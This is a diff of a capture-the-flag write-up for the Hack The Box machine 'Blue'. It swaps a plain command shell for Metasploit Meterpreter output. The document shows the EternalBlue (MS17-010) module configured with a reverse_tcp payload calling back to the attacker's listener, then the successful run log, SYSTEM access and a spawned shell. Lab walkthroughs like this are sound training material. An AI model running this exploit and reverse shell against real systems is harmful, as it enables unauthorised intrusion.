@@ -10,11 +10,17 @@ comments: false
 An easy box by ch4p.  Great for getting to know metasploit, or practice if you want to find and modify the exploit from exploit-db.com.
 
 {% highlight bash %}
-C:\Windows\System32>whoami	        
-nt authority\system
-
-C:\Windows\System32>hostname
-haris-PC
+meterpreter > sysinfo
+Computer        : HARIS-PC
+OS              : Windows 7 (6.1 Build 7601, Service Pack 1).
+Architecture    : x64
+System Language : en_GB
+Domain          : WORKGROUP
+Logged On Users : 0
+Meterpreter     : x64/windows
+meterpreter > getuid
+Server username: NT AUTHORITY\SYSTEM
+meterpreter >
 {% endhighlight %}
 
 <!--more-->
@@ -105,13 +111,13 @@ Module options (exploit/windows/smb/ms17_010_eternalblue):
    VERIFY_TARGET  true             yes       Check if remote OS matches exploit Target.
 
 
-Payload options (windows/x64/shell_reverse_tcp):
+ Payload options (windows/x64/meterpreter/reverse_tcp):
 
-   Name      Current Setting  Required  Description
-   ----      ---------------  --------  -----------
-   EXITFUNC  thread           yes       Exit technique (Accepted: '', seh, thread, process, none)
-   LHOST     10.10.14.17      yes       The listen address (an interface may be specified)
-   LPORT     443             yes       The listen port
+    Name      Current Setting  Required  Description
+    ----      ---------------  --------  -----------
+    EXITFUNC  thread           yes       Exit technique (Accepted: '', seh, thread, process, none)
+    LHOST     10.10.14.17      yes       The listen address (an interface may be specified)
+    LPORT     443              yes       The listen port
 
 
 Exploit target:
@@ -150,10 +156,25 @@ msf5 exploit(windows/smb/ms17_010_eternalblue) > run
 [+] 10.10.10.40:445 - ETERNALBLUE overwrite completed successfully (0xC000000D)!
 [*] 10.10.10.40:445 - Sending egg to corrupted connection.
 [*] 10.10.10.40:445 - Triggering free of corrupted buffer.
-[*] Command shell session 1 opened (10.10.14.17:443 -> 10.10.10.40:49158) at 2020-02-06 10:21:13 -0700
+[*] Meterpreter session 1 opened (10.10.14.17:443 -> 10.10.10.40:49158) at 2020-02-06 10:21:13 -0700
 [+] 10.10.10.40:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
 [+] 10.10.10.40:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-WIN-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
 [+] 10.10.10.40:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
+meterpreter > sysinfo
+Computer        : HARIS-PC
+OS              : Windows 7 (6.1 Build 7601, Service Pack 1).
+Architecture    : x64
+System Language : en_GB
+Domain          : WORKGROUP
+Logged On Users : 0
+Meterpreter     : x64/windows
+meterpreter > getuid
+Server username: NT AUTHORITY\SYSTEM
+meterpreter > shell
+Process 2828 created.
+Channel 1 created.
+Microsoft Windows [Version 6.1.7601]
+Copyright (c) 2009 Microsoft Corporation.  All rights reserved.
 
 C:\Windows\system32>cd \users\administrator\desktop
 cd \users\administrator\desktop
